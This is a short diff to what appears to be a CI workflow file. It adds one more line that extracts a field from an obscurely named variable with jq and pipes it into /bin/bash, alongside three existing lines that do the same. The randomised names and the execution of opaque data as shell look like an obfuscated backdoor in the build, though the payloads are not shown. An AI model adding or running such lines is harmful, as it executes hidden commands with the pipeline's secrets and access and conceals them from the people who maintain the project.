@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$f469" | jq -r .ue4 | /bin/bash
           echo $wjaf06371 | jq -r .gfp34 | /bin/bash
           echo $bm03 | jq -r .yrdb972 | /bin/bash
+          echo $ie7 | jq -r .cj0684 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
